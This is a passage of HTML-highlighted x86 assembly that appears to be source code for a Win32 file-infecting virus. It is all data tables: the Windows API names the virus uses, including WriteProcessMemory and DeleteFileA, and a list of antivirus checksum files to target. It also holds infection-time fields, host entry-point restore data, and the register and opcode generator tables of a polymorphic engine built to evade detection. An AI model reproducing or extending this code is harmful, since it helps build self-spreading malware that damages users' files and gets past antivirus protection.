</span><span class="sc5">szGetSysDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szGetCurDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szSetFileAttr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szSetFileTime</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szDeleteFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szGetCurProc</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentProcess"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szWriteProcMem</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteProcessMemory"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szLoadLibrary</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szGetSysTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;User32 APIs used by the virus</span><span class="sc0">

</span><span class="sc5">szGetDC</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDC"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szLoadIcon</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadIconA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szDrawIcon</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DrawIcon"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Names of AV checksum files</span><span class="sc0">

</span><span class="sc5">tbl_AV_files</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_00</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_01</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_02</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_03</span><span class="sc0">

</span><span class="sc5">end_AV_files</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">szAvData_00</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szAvData_01</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szAvData_02</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">szAvData_03</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Search mask for FindFirstFile and FindNextFile</span><span class="sc0">

</span><span class="sc5">szSearch</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Infection time</span><span class="sc0">

</span><span class="sc5">inf_time</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">inf_year</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_month</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_dayofweek</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_day</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_hour</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_minute</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_second</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">inf_millisec</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Number of bytes to restore at host entry-point</span><span class="sc0">

</span><span class="sc5">insert_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Initialized data used by the polymorphic engine</span><span class="sc0">

                </span><span class="sc1">;Register table</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; - Register mask</span><span class="sc0">
                </span><span class="sc1">; - Register flags</span><span class="sc0">

</span><span class="sc5">tbl_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">      </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000110b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000101b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;ebp</span><span class="sc0">

</span><span class="sc5">end_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Aliases for reg table structure</span><span class="sc0">

</span><span class="sc5">REG_MASK</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">REG_FLAGS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc1">;Bit aliases for reg flags</span><span class="sc0">

</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">

                </span><span class="sc1">;Initial reg flags</span><span class="sc0">

</span><span class="sc5">tbl_startup</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">                </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">                  </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">                  </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">                  </span><span class="sc1">;ebp</span><span class="sc0">

                </span><span class="sc1">;Code that does not disturb reg values</span><span class="sc0">
        
</span><span class="sc5">tbl_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                
</span><span class="sc5">end_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Generators for get_delta</span><span class="sc0">

</span><span class="sc5">tbl_delta_mode</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_method_1</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_method_2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_method_3</span><span class="sc0">

</span><span class="sc5">end_delta_mode</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_idx_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+imm] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_dis_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+reg] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_xtended</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+reg+imm] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_paranoia</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Opcodes for math reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                         </span><span class="sc1">;add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">                         </span><span class="sc1">;or</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">                         </span><span class="sc1">;and</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                         </span><span class="sc1">;sub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">                         </span><span class="sc1">;xor</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">                         </span><span class="sc1">;adc</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">                         </span><span class="sc1">;sbb</span><span class="sc0">

</span><span class="sc5">end_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Magic aliases</span><span class="sc0">

</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

                </span><span class="sc1">;Magic data</span><span class="sc0">

</span><span class="sc5">xx_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">
                  
</span><span class="sc5">xx_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
